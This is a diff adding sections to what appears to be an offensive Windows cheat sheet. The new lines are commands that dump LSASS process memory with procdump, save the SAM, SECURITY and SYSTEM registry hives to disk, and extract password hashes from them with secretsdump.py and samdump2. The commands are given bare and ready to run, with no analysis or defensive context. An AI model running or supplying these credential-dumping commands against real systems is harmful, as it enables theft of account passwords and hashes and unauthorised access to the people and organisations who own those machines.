@@ -19,6 +19,27 @@ create full C:\ntdsutil
 quit
 quit
 ```
+
+### Procdump
+```
+procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+minidump.exe lsass.dmp
+```
+### LSA 
+```
+reg save hklm\sam c:\Users\Public\sam.save
+reg save hklm\security c:\Users\Public\security.save
+reg save hklm\system c:\Users\Public\system.save
+
+secretsdump.py -sam sam.save -security security.save -system system.save LOCAL 
+secretsdump.py -sam /root/Desktop/sam.save -security /root/Desktop/security.save -system /root/Desktop/system.save LOCAL
+
+reg save hklm\sam sam.hiv
+reg save hklm\system system.hiv
+samdump2 system.hiv sam.hiv > hash.txt
+```
+
+
 ```
 Import-Module .\Copy-VSS.ps1
 Copy-VSS
